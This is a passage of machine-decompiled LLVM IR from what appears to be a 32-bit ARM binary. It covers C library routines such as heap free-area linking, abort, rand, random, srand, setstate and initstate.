dec_label_pc_13840:                               ; preds = %dec_label_pc_13820
  %v1_13840 = inttoptr i32 %v0_13878 to i32*
  %v2_13840 = load i32, i32* %v1_13840, align 4
  store i32 %v2_13840, i32* @ip, align 4
  %v2_13844 = sub i32 %v0_13878, %v2_13840
  %v1_13848 = add i32 %v2_13844, 12
  %v3_1384c = icmp uge i32 %v1_13848, %v2_13814
  %v9_1384c = icmp eq i32 %v1_13848, %v2_13814
  %v2_13850 = xor i1 %v9_1384c, true
  %v3_13850 = and i1 %v3_1384c, %v2_13850
  br i1 %v3_13850, label %dec_label_pc_138e0, label %dec_label_pc_13854

dec_label_pc_13854:                               ; preds = %dec_label_pc_13840
  %v2_13854 = add i32 %v2_13840, %arg3
  store i32 %v2_13854, i32* %r7.global-to-local, align 4
  br i1 %v9_1384c, label %dec_label_pc_1385c, label %dec_label_pc_13888

dec_label_pc_1385c:                               ; preds = %dec_label_pc_13854
  %v2_1385c = icmp eq i32 %v0_13870, 0
  br i1 %v2_1385c, label %dec_label_pc_138d4, label %dec_label_pc_13864

dec_label_pc_13864:                               ; preds = %dec_label_pc_1385c
  %v1_13864 = add i32 %v0_13870, 12
  %v9_13868 = icmp eq i32 %v1_13864, %arg2
  br i1 %v9_13868, label %dec_label_pc_13870, label %dec_label_pc_138d4

dec_label_pc_13870:                               ; preds = %dec_label_pc_13864
  %v1_13870 = inttoptr i32 %v0_13870 to i32*
  %v2_13870 = load i32, i32* %v1_13870, align 4
  %v1_13874 = add i32 %v0_13870, 8
  %v2_13874 = inttoptr i32 %v1_13874 to i32*
  %v3_13874 = load i32, i32* %v2_13874, align 4
  store i32 %v3_13874, i32* @r2, align 4
  store i32 %v0_13878, i32* @r1, align 4
  %v2_1387c = add i32 %v2_13870, %v2_13854
  store i32 %v2_1387c, i32* %r7.global-to-local, align 4
  %v0_13880 = call i32 @__heap_link_free_area_after()
  br label %dec_label_pc_138d4

dec_label_pc_13888:                               ; preds = %dec_label_pc_13854
  %v1_13888 = add i32 %v0_13878, 4
  %v2_13888 = inttoptr i32 %v1_13888 to i32*
  %v3_13888 = load i32, i32* %v2_13888, align 4
  store i32 %v3_13888, i32* %r5.global-to-local, align 4
  %v2_1388c = icmp eq i32 %v3_13888, 0
  br i1 %v2_1388c, label %dec_label_pc_138c0, label %dec_label_pc_13894

dec_label_pc_13894:                               ; preds = %dec_label_pc_13888
  %v1_13894 = inttoptr i32 %v3_13888 to i32*
  %v2_13894 = load i32, i32* %v1_13894, align 4
  store i32 %v2_13894, i32* @ip, align 4
  %v2_13898 = sub i32 %v3_13888, %v2_13894
  %v1_1389c = add i32 %v2_13898, 12
  %v9_138a0 = icmp eq i32 %v2_13814, %v1_1389c
  br i1 %v9_138a0, label %dec_label_pc_138a8, label %dec_label_pc_138c0

dec_label_pc_138a8:                               ; preds = %dec_label_pc_13894
  store i32 %v0_13870, i32* @r2, align 4
  store i32 %v3_13888, i32* @r1, align 4
  %v2_138b0 = add i32 %v2_13894, %v2_13854
  store i32 %v2_138b0, i32* %r7.global-to-local, align 4
  %v0_138b4 = call i32 @__heap_link_free_area_after()
  %v0_138b8 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_138b8, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_138d4

dec_label_pc_138c0:                               ; preds = %dec_label_pc_13894, %dec_label_pc_13888
  %v2_138c0 = add i32 %v0_13878, %arg3
  store i32 %v2_138c0, i32* %r4.global-to-local, align 4
  store i32 %v3_13888, i32* @r3, align 4
  store i32 %v0_13870, i32* @r2, align 4
  store i32 %v2_138c0, i32* @r1, align 4
  %v0_138d0 = call i32 @__heap_link_free_area()
  br label %dec_label_pc_138d4

dec_label_pc_138d4:                               ; preds = %dec_label_pc_13864, %dec_label_pc_1385c, %dec_label_pc_138a8, %dec_label_pc_13870, %dec_label_pc_138c0
  %v0_138d4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_138d4, i32* %r5.global-to-local, align 4
  %v0_138d8 = load i32, i32* %r7.global-to-local, align 4
  %v2_138d8 = inttoptr i32 %v0_138d4 to i32*
  store i32 %v0_138d8, i32* %v2_138d8, align 4
  br label %dec_label_pc_138f8

dec_label_pc_13830.dec_label_pc_138e0.loopexit_crit_edge: ; preds = %dec_label_pc_13828
  br label %dec_label_pc_138e0

dec_label_pc_138e0:                               ; preds = %entry, %dec_label_pc_13830.dec_label_pc_138e0.loopexit_crit_edge, %dec_label_pc_13840
  %v1_138e0 = add i32 %v2_13814, -12
  store i32 %v1_138e0, i32* %r5.global-to-local, align 4
  %v3_138e4 = inttoptr i32 %v1_138e0 to i32*
  store i32 %arg3, i32* %v3_138e4, align 4
  %v0_138e8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_138e8, i32* @r3, align 4
  %v0_138ec = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_138ec, i32* @r2, align 4
  %v0_138f0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_138f0, i32* @r1, align 4
  %v0_138f4 = call i32 @__heap_link_free_area()
  br label %dec_label_pc_138f8

dec_label_pc_138f8:                               ; preds = %dec_label_pc_138d4, %dec_label_pc_138e0
  %v0_138f8 = load i32, i32* %r5.global-to-local, align 4
  %v2_138fc = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_138fc, i32* @r4, align 4
  ret i32 %v0_138f8

; uselistorder directives
  uselistorder i32 %v3_13888, { 0, 1, 3, 2, 4, 5 }
  uselistorder i1 %v9_1384c, { 1, 0 }
  uselistorder i32 %v3_1382c, { 2, 3, 1, 0 }
  uselistorder i32 %v0_13878, { 0, 2, 1, 3, 4, 6, 7, 5 }
  uselistorder i32 %v0_13870, { 4, 5, 1, 0, 2, 3 }
  uselistorder i32* %r7.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r5.global-to-local, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32* %r4.global-to-local, { 3, 4, 0, 1, 2, 5 }
  uselistorder i32 ()* @__heap_link_free_area, { 1, 0 }
  uselistorder i32 ()* @__heap_link_free_area_after, { 1, 0 }
  uselistorder i32 %arg3, { 3, 0, 1, 2 }
  uselistorder i32 %arg2, { 1, 2, 0 }
  uselistorder label %dec_label_pc_138f8, { 1, 0 }
  uselistorder label %dec_label_pc_138e0, { 1, 2, 0 }
  uselistorder label %dec_label_pc_138d4, { 4, 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_13820, { 1, 0 }
}

define i32 @abort() local_unnamed_addr {
dec_label_pc_1391c.lr.ph:
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %stack_var_-128 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %stack_var_-268 = alloca i32, align 4
  %v2_13900 = ptrtoint i32* %stack_var_-268 to i32
  %v2_13910 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_2b7ac.707 to i32))
  store i32 31, i32* %r1.global-to-local, align 4
  %v2_1391c = ptrtoint i32* %stack_var_0 to i32
  br label %dec_label_pc_1391c

dec_label_pc_1391c:                               ; preds = %dec_label_pc_1391c.lr.ph, %dec_label_pc_1391c
  %v1_13920 = phi i32 [ 31, %dec_label_pc_1391c.lr.ph ], [ %v1_1392c, %dec_label_pc_1391c ]
  %v4_13920 = mul i32 %v1_13920, 4
  %v5_13920 = add i32 %v4_13920, %v2_1391c
  %v2_13928 = add i32 %v5_13920, -128
  %v3_13928 = inttoptr i32 %v2_13928 to i32*
  store i32 0, i32* %v3_13928, align 4
  %v0_1392c = load i32, i32* %r1.global-to-local, align 4
  %v1_1392c = add i32 %v0_1392c, -1
  store i32 %v1_1392c, i32* %r1.global-to-local, align 4
  %v6_1392c = icmp slt i32 %v1_1392c, 0
  br i1 %v6_1392c, label %dec_label_pc_13934, label %dec_label_pc_1391c

dec_label_pc_13934:                               ; preds = %dec_label_pc_1391c
  %v2_13934 = ptrtoint i32* %stack_var_-128 to i32
  store i32 %v2_13934, i32* @r4, align 4
  store i32 %v2_13934, i32* @r0, align 4
  store i32 6, i32* @r1, align 4
  %v0_13940 = call i32 @__sigaddset()
  %v2_13944 = icmp eq i32 %v0_13940, 0
  br i1 %v2_13944, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_13934
  store i32 %v2_13934, i32* %r1.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_13934, %bb
  store i32 80216, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_13944, i32 ptrtoint (i32* @global_var_10930.549 to i32))
  %v2_1395c = load i32, i32* @global_var_300b4.710, align 4
  %v2_13960 = icmp eq i32 %v2_1395c, 0
  br i1 %v2_13960, label %dec_label_pc_13968, label %dec_label_pc_13998

dec_label_pc_13968:                               ; preds = %.thread1
  store i32 1, i32* @global_var_300b4.710, align 4
  br label %dec_label_pc_13970

dec_label_pc_13970:                               ; preds = %dec_label_pc_139e8, %dec_label_pc_13968
  store i32 ptrtoint (i32* @global_var_2b7ac.707 to i32), i32* @r0, align 4
  %v1_1397c = call i32 @pthread_mutex_unlock()
  %v1_13984 = call i32 @__GI_raise(i32 6)
  store i32 80280, i32* @lr, align 4
  %v2_13994 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_2b7ac.707 to i32))
  %v2_1399c.pre = load i32, i32* @global_var_300b4.710, align 4
  br label %dec_label_pc_13998

dec_label_pc_13998:                               ; preds = %.thread1, %dec_label_pc_13970
  %v0_13a0c = phi i32 [ %v2_1395c, %.thread1 ], [ %v2_1399c.pre, %dec_label_pc_13970 ]
  store i32 ptrtoint (i32* @global_var_300b4.710 to i32), i32* %ip.global-to-local, align 4
  %v7_139a0 = icmp eq i32 %v0_13a0c, 1
  br i1 %v7_139a0, label %dec_label_pc_139d0.lr.ph, label %dec_label_pc_13a04

dec_label_pc_139d0.lr.ph:                         ; preds = %dec_label_pc_13998
  store i32 0, i32* @r1, align 4
  store i32 %v2_13900, i32* @r0, align 4
  store i32 140, i32* @r2, align 4
  store i32 2, i32* @global_var_300b4.710, align 4
  %v0_139bc = call i32 @__GI_memset()
  store i32 0, i32* %stack_var_-268, align 4
  store i32 31, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_139d0

dec_label_pc_139d0:                               ; preds = %dec_label_pc_139d0.lr.ph, %dec_label_pc_139d0
  %v1_139d4 = phi i32 [ 31, %dec_label_pc_139d0.lr.ph ], [ %v1_139e0, %dec_label_pc_139d0 ]
  %v4_139d4 = mul i32 %v1_139d4, 4
  %v5_139d4 = add i32 %v4_139d4, %v2_1391c
  %v2_139dc = add i32 %v5_139d4, -264
  %v3_139dc = inttoptr i32 %v2_139dc to i32*
  store i32 -1, i32* %v3_139dc, align 4
  %v0_139e0 = load i32, i32* %r1.global-to-local, align 4
  %v1_139e0 = add i32 %v0_139e0, -1
  store i32 %v1_139e0, i32* %r1.global-to-local, align 4
  %v6_139e0 = icmp slt i32 %v1_139e0, 0
  br i1 %v6_139e0, label %dec_label_pc_139e8, label %dec_label_pc_139d0

dec_label_pc_139e8:                               ; preds = %dec_label_pc_139d0
  store i32 %v2_13900, i32* %r1.global-to-local, align 4
  %v4_139fc = call i32 @__GI_sigaction(i32 6, i32* nonnull %stack_var_-268, i32 0)
  br label %dec_label_pc_13970

dec_label_pc_13a04:                               ; preds = %dec_label_pc_13998
  %v7_13a04 = icmp eq i32 %v0_13a0c, 2
  br i1 %v7_13a04, label %dec_label_pc_13a0c, label %dec_label_pc_13a18

dec_label_pc_13a0c:                               ; preds = %dec_label_pc_13a04
  store i32 3, i32* @global_var_300b4.710, align 4
  %v0_13a14 = call i32 @abort()
  %v2_13a18.pre = load i32, i32* @global_var_300b4.710, align 4
  br label %dec_label_pc_13a18

dec_label_pc_13a18:                               ; preds = %dec_label_pc_13a04, %dec_label_pc_13a0c
  %v1_13a20 = phi i32 [ %v0_13a0c, %dec_label_pc_13a04 ], [ %v2_13a18.pre, %dec_label_pc_13a0c ]
  %v7_13a1c = icmp eq i32 %v1_13a20, 3
  br i1 %v7_13a1c, label %bb27, label %.thread3

bb27:                                             ; preds = %dec_label_pc_13a18
  %v2_13a28 = load i32, i32* %ip.global-to-local, align 4
  %v3_13a28 = inttoptr i32 %v2_13a28 to i32*
  store i32 4, i32* %v3_13a28, align 4
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_13a18, %bb27
  call void @__pseudo_cond_branch(i1 %v7_13a1c, i32 ptrtoint (i32* @global_var_ffec.712 to i32))
  br label %dec_label_pc_13a30

dec_label_pc_13a30:                               ; preds = %dec_label_pc_13a30, %.thread3
  %v0_13a30 = call i32 @abort()
  br label %dec_label_pc_13a30

; uselistorder directives
  uselistorder i32 %v1_139e0, { 2, 1, 0 }
  uselistorder i32 %v1_1392c, { 2, 1, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 4, 3, 0, 5, 7, 6, 1 }
  uselistorder i32 140, { 1, 0 }
  uselistorder i32 ()* @pthread_mutex_unlock, { 2, 9, 8, 4, 0, 3, 7, 6, 5, 21, 20, 19, 18, 22, 17, 16, 1, 15, 14, 13, 12, 11, 10 }
  uselistorder i32* @global_var_300b4.710, { 1, 2, 0, 6, 3, 4, 5 }
  uselistorder i32 ptrtoint (i32* @global_var_2b7ac.707 to i32), { 0, 2, 1 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_13a18, { 1, 0 }
  uselistorder label %dec_label_pc_139d0, { 1, 0 }
  uselistorder label %dec_label_pc_13998, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_1391c, { 1, 0 }
}

define i32 @rand() local_unnamed_addr {
entry:
  %v0_13a48 = call i32 @random()
  ret i32 %v0_13a48

; uselistorder directives
  uselistorder i32 ()* @random, { 6, 5, 4, 3, 2, 1, 0 }
}

define i32 @random() local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_13a4c = load i32, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_2b7c4.714 to i32), i32* @r4, align 4
  %v2_13a54 = ptrtoint i32* %stack_var_-32 to i32
  store i32 ptrtoint (i32* @global_var_2b7c4.714 to i32), i32* @r2, align 4
  store i32 ptrtoint (i8* @global_var_f360.275 to i32), i32* @r1, align 4
  store i32 %v2_13a54, i32* @r0, align 4
  %v1_13a6c = call i32 @__pthread_cleanup_push_defer()
  %v0_13a74 = load i32, i32* @r4, align 4
  %v2_13a7c = call i32 @pthread_mutex_lock(i32 %v0_13a74)
  %v2_13a80 = ptrtoint i32* %stack_var_-16 to i32
  %v3_13a88 = call i32 @__GI_random_r(i32* inttoptr (i32 178140 to i32*), i32 %v2_13a80)
  store i32 %v2_13a54, i32* @r0, align 4
  store i32 1, i32* @r1, align 4
  store i32 80544, i32* @lr, align 4
  %v1_13a9c = call i32 @__pthread_cleanup_pop_restore()
  %v3_13aa0 = load i32, i32* %stack_var_-16, align 4
  store i32 %v3_13a4c, i32* @r4, align 4
  ret i32 %v3_13aa0
}

define i32 @setstate(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %v2_13acc = ptrtoint i32* %stack_var_-28 to i32
  store i32 ptrtoint (i32* @global_var_2b7c4.714 to i32), i32* @r2, align 4
  store i32 %arg1, i32* @r4, align 4
  store i32 ptrtoint (i8* @global_var_f360.275 to i32), i32* @r1, align 4
  store i32 %v2_13acc, i32* @r0, align 4
  %v1_13ae8 = call i32 @__pthread_cleanup_push_defer()
  %v2_13af8 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_2b7c4.714 to i32))
  %v0_13b00 = load i32, i32* @r4, align 4
  %v3_13b08 = load i32, i32* bitcast (i32** @global_var_2b7e4.727 to i32*), align 4
  store i32 %v3_13b08, i32* @r4, align 4
  %v3_13b0c = call i32 @setstate_r(i32 %v0_13b00, i32* nonnull @global_var_2b7dc)
  store i32 1, i32* @r1, align 4
  %v1_13b14 = icmp slt i32 %v3_13b0c, 0
  store i32 %v2_13acc, i32* @r0, align 4
  %. = select i1 %v1_13b14, i32 0, i32 ptrtoint (i32** @global_var_2b7e0.729 to i32)
  store i32 %., i32* @r5, align 4
  store i32 80688, i32* @lr, align 4
  %v1_13b2c = call i32 @__pthread_cleanup_pop_restore()
  %v0_13b30 = load i32, i32* @r5, align 4
  ret i32 %v0_13b30
}

define i32 @initstate(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_2b7c4.714 to i32), i32* @r4, align 4
  %v2_13b5c = ptrtoint i32* %stack_var_-40 to i32
  store i32 %arg1, i32* @r8, align 4
  store i32 %arg2, i32* @r5, align 4
  store i32 %arg3, i32* @r6, align 4
  store i32 ptrtoint (i8* @global_var_f360.275 to i32), i32* @r1, align 4
  store i32 ptrtoint (i32* @global_var_2b7c4.714 to i32), i32* @r2, align 4
  store i32 %v2_13b5c, i32* @r0, align 4
  %v1_13b80 = call i32 @__pthread_cleanup_push_defer()
  %v0_13b84 = load i32, i32* @r4, align 4
  %v2_13b90 = call i32 @pthread_mutex_lock(i32 %v0_13b84)
  %v0_13b98 = load i32, i32* @r5, align 4
  %v0_13b9c = load i32, i32* @r6, align 4
  %v0_13ba0 = load i32, i32* @r8, align 4
  store i32 %v0_13ba0, i32* @r0, align 4
  %v3_13ba4 = load i32, i32* bitcast (i32** @global_var_2b7e4.727 to i32*), align 4
  store i32 %v3_13ba4, i32* @r4, align 4
  %v4_13ba8 = inttoptr i32 %v0_13ba0 to i32*
  %v5_13ba8 = call i32 @__GI_initstate_r(i32* %v4_13ba8, i32 %v0_13b98, i32 %v0_13b9c, i32 ptrtoint (i32* @global_var_2b7dc to i32))
  store i32 %v2_13b5c, i32* @r0, align 4
  store i32 1, i32* @r1, align 4
  store i32 80832, i32* @lr, align 4
  %v1_13bbc = call i32 @__pthread_cleanup_pop_restore()
  ret i32 ptrtoint (i32** @global_var_2b7e0.729 to i32)
}

define i32 @srand(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-32 = alloca i32, align 4
  %v3_13bec = load i32, i32* @r4, align 4
  %v6_13bec = load i32, i32* @r5, align 4
  %v9_13bec = load i32, i32* @r6, align 4
  store i32 ptrtoint (i32* @global_var_2b7c4.714 to i32), i32* @r4, align 4
  %v2_13bf4 = ptrtoint i32* %stack_var_-32 to i32
  store i32 ptrtoint (i32* @global_var_2b7c4.714 to i32), i32* @r2, align 4
  store i32 %arg1, i32* @r6, align 4
  store i32 ptrtoint (i8* @global_var_f360.275 to i32), i32* @r1, align 4
  store i32 %v2_13bf4, i32* @r0, align 4
  %v1_13c10 = call i32 @__pthread_cleanup_push_defer()
  %v0_13c18 = load i32, i32* @r4, align 4
  %v2_13c20 = call i32 @pthread_mutex_lock(i32 %v0_13c18)
  %v0_13c24 = load i32, i32* @r6, align 4
  store i32 %v0_13c24, i32* @r0, align 4
  %v2_13c2c = inttoptr i32 %v0_13c24 to i32*
  %v3_13c2c = call i32 @srandom_r(i32* %v2_13c2c, i32 ptrtoint (i32* @global_var_2b7dc to i32))
  store i32 %v2_13bf4, i32* @r0, align 4
  store i32 1, i32* @r1, align 4
  store i32 %v2_13bf4, i32* @r5, align 4
  store i32 80968, i32* @lr, align 4
  %v1_13c44 = call i32 @__pthread_cleanup_pop_restore()
  store i32 %v3_13bec, i32* @r4, align 4
  store i32 %v6_13bec, i32* @r5, align 4
  store i32 %v9_13bec, i32* @r6, align 4
  ret i32 %v1_13c44

; uselistorder directives
  uselistorder i32* @global_var_2b7dc, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_2b7dc to i32), { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_2b7c4.714 to i32), { 1, 4, 0, 5, 2, 6, 3, 7 }
}

define i32 @setstate_r(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-20 = alloca i32, align 4
  %v1_13c68 = add i32 %tmp, 12
  %v2_13c68 = inttoptr i32 %v1_13c68 to i32*
  %v3_13c68 = load i32, i32* %v2_13c68, align 4
  %v3_13c6c = load i32, i32* @r4, align 4
  store i32 %v3_13c6c, i32* %stack_var_-20, align 4
  %v2_13c70 = icmp eq i32 %v3_13c68, 0
  store i32 %tmp, i32* %r4.global-to-local, align 4
  br i1 %v2_13c70, label %.thread7, label %.thread8

.thread7:                                         ; preds = %entry
  %v1_13c7c1 = add i32 %tmp, 8
  %v2_13c7c2 = inttoptr i32 %v1_13c7c1 to i32*
  %v3_13c7c3 = load i32, i32* %v2_13c7c2, align 4
  store i32 %v3_13c7c3, i32* %r1.global-to-local, align 4
  %v3_13c90 = add i32 %v3_13c7c3, -4
  %v4_13c90 = inttoptr i32 %v3_13c90 to i32*
  store i32 0, i32* %v4_13c90, align 4
  br label %bb

.thread8:                                         ; preds = %entry
  %v2_13c78 = add i32 %tmp, 4
  %v3_13c78 = inttoptr i32 %v2_13c78 to i32*
  %v4_13c78 = load i32, i32* %v3_13c78, align 4
  %v1_13c7c = add i32 %tmp, 8
  %v2_13c7c = inttoptr i32 %v1_13c7c to i32*
  %v3_13c7c = load i32, i32* %v2_13c7c, align 4
  store i32 %v3_13c7c, i32* %r1.global-to-local, align 4
  %v3_13c80 = sub i32 %v4_13c78, %v3_13c7c
  %v4_13c84 = sdiv i32 %v3_13c80, 4
  %v4_13c8c = mul i32 %v4_13c84, 5
  %v5_13c8c = add i32 %v4_13c8c, %v3_13c68
  %v3_13c94 = add i32 %v3_13c7c, -4
  %v4_13c94 = inttoptr i32 %v3_13c94 to i32*
  store i32 %v5_13c8c, i32* %v4_13c94, align 4
  br label %bb

bb:                                               ; preds = %.thread7, %.thread8
  %v1_13c98 = add i32 %arg1, 4
  store i32 %v1_13c98, i32* %r6.global-to-local, align 4
  %v2_13c9c = inttoptr i32 %arg1 to i32*
  %v3_13c9c = load i32, i32* %v2_13c9c, align 4
  store i32 5, i32* %r1.global-to-local, align 4
  %v2_13ca4 = srem i32 %v3_13c9c, 5
  store i32 %v2_13ca4, i32* %r0.global-to-local, align 4
  %v2_13cb0 = and i32 %v2_13ca4, 1073741824
  %v3_13cb0 = icmp ne i32 %v2_13cb0, 0
  %v4_13cb0 = mul nsw i32 %v2_13ca4, 4
  %v2_13cb4 = icmp ne i32 %v2_13ca4, 4
  %v3_13cb4 = and i1 %v3_13cb0, %v2_13cb4
  br i1 %v3_13cb4, label %dec_label_pc_13d10, label %dec_label_pc_13cb8

dec_label_pc_13cb8:                               ; preds = %bb
  %v5_13cb0 = add i32 %v4_13cb0, ptrtoint (i32* @global_var_1e254.743 to i32)
  %v1_13cb8 = add i32 %v4_13cb0, add (i32 ptrtoint (i32* @global_var_1e254.743 to i32), i32 20)
  %v2_13cb8 = inttoptr i32 %v1_13cb8 to i32*
  %v3_13cb8 = load i32, i32* %v2_13cb8, align 4
  store i32 %v3_13cb8, i32* %r5.global-to-local, align 4
  %v6_13cbc = inttoptr i32 %v5_13cb0 to i32*
  %v7_13cbc = load i32, i32* %v6_13cbc, align 4
  store i32 %v7_13cbc, i32* %r7.global-to-local, align 4
  %v2_13cc0 = icmp eq i32 %v2_13ca4, 0
  store i32 5, i32* %r1.global-to-local, align 4
  %v1_13cc8 = load i32, i32* %r4.global-to-local, align 4
  %v2_13cc8 = add i32 %v1_13cc8, 16
  %v3_13cc8 = inttoptr i32 %v2_13cc8 to i32*
  store i32 %v3_13cb8, i32* %v3_13cc8, align 4
  %v0_13ccc = load i32, i32* %r7.global-to-local, align 4
  %v1_13ccc = load i32, i32* %r4.global-to-local, align 4
  %v2_13ccc = add i32 %v1_13ccc, 20
  %v3_13ccc = inttoptr i32 %v2_13ccc to i32*
  store i32 %v0_13ccc, i32* %v3_13ccc, align 4
  %v0_13cd0 = load i32, i32* %r0.global-to-local, align 4
  %v1_13cd0 = load i32, i32* %r4.global-to-local, align 4
  %v2_13cd0 = add i32 %v1_13cd0, 12
  %v3_13cd0 = inttoptr i32 %v2_13cd0 to i32*
  store i32 %v0_13cd0, i32* %v3_13cd0, align 4
  br i1 %v2_13cc0, label %dec_label_pc_13cfc, label %dec_label_pc_13cd8

dec_label_pc_13cd8:                               ; preds = %dec_label_pc_13cb8
  %v0_13cd8 = load i32, i32* %r6.global-to-local, align 4
  %v1_13cd8 = add i32 %v0_13cd8, -4
  %v2_13cd8 = inttoptr i32 %v1_13cd8 to i32*
  %v3_13cd8 = load i32, i32* %v2_13cd8, align 4
  %v1_13cdc = load i32, i32* %r1.global-to-local, align 4
  %v2_13cdc = sdiv i32 %v3_13cd8, %v1_13cdc
  store i32 %v2_13cdc, i32* %r0.global-to-local, align 4
  %v4_13ce0 = mul i32 %v2_13cdc, 4
  %v5_13ce0 = add i32 %v4_13ce0, %v0_13cd8
  %v1_13ce4 = load i32, i32* %r4.global-to-local, align 4
  %v2_13ce4 = add i32 %v1_13ce4, 4
  %v3_13ce4 = inttoptr i32 %v2_13ce4 to i32*
  store i32 %v5_13ce0, i32* %v3_13ce4, align 4
  %v0_13ce8 = load i32, i32* %r0.global-to-local, align 4
  %v1_13ce8 = load i32, i32* %r7.global-to-local, align 4
  %v2_13ce8 = add i32 %v1_13ce8, %v0_13ce8
  %v0_13cec = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_13cec, i32* %r1.global-to-local, align 4
  %v2_13cf0 = srem i32 %v2_13ce8, %v0_13cec
  %v0_13cf4 = load i32, i32* %r6.global-to-local, align 4
  %v4_13cf4 = mul i32 %v2_13cf0, 4
  %v5_13cf4 = add i32 %v0_13cf4, %v4_13cf4
  store i32 %v5_13cf4, i32* %r0.global-to-local, align 4
  %v1_13cf8 = load i32, i32* %r4.global-to-local, align 4
  %v2_13cf8 = inttoptr i32 %v1_13cf8 to i32*
  store i32 %v5_13cf4, i32* %v2_13cf8, align 4
  br label %dec_label_pc_13cfc

dec_label_pc_13cfc:                               ; preds = %dec_label_pc_13cb8, %dec_label_pc_13cd8
  %v0_13cfc = load i32, i32* %r6.global-to-local, align 4
  %v1_13cfc = load i32, i32* %r5.global-to-local, align 4
  %v4_13cfc = mul i32 %v1_13cfc, 4
  %v5_13cfc = add i32 %v4_13cfc, %v0_13cfc
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_13d04 = load i32, i32* %r4.global-to-local, align 4
  %v2_13d04 = add i32 %v1_13d04, 24
  %v3_13d04 = inttoptr i32 %v2_13d04 to i32*
  store i32 %v5_13cfc, i32* %v3_13d04, align 4
  %v0_13d08 = load i32, i32* %r6.global-to-local, align 4
  %v1_13d08 = load i32, i32* %r4.global-to-local, align 4
  %v2_13d08 = add i32 %v1_13d08, 8
  %v3_13d08 = inttoptr i32 %v2_13d08 to i32*
  store i32 %v0_13d08, i32* %v3_13d08, align 4
  %v2_13d0c = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_13d0c, i32* @r4, align 4
  ret i32 0

dec_label_pc_13d10:                               ; preds = %bb
  %v0_13d10 = call i32 @__errno_location()
  %v2_13d18 = inttoptr i32 %v0_13d10 to i32*
  store i32 22, i32* %v2_13d18, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_13d20 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_13d20, i32* @r4, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 %v2_13ca4, { 1, 0, 3, 2, 4 }
  uselistorder i32 %tmp, { 1, 4, 0, 3, 2, 5 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32* %r0.global-to-local, { 5, 6, 7, 3, 4, 1, 2, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13cfc, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @__GI_random_r(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v1_13d28 = add i32 %tmp, 12
  %v2_13d28 = inttoptr i32 %v1_13d28 to i32*
  %v3_13d28 = load i32, i32* %v2_13d28, align 4
  store i32 %v3_13d28, i32* %r3.global-to-local, align 4
  %v2_13d2c = icmp eq i32 %v3_13d28, 0
  %v3_13d30 = load i32, i32* @r4, align 4
  store i32 %v3_13d30, i32* %stack_var_-12, align 4
  store i32 %tmp, i32* %ip.global-to-local, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  %v1_13d3c = add i32 %tmp, 8
  %v2_13d3c = inttoptr i32 %v1_13d3c to i32*
  %v3_13d3c = load i32, i32* %v2_13d3c, align 4
  store i32 %v3_13d3c, i32* %lr.global-to-local, align 4
  br i1 %v2_13d2c, label %dec_label_pc_13d44, label %dec_label_pc_13d68

dec_label_pc_13d44:                               ; preds = %entry
  %v1_13d44 = inttoptr i32 %v3_13d3c to i32*
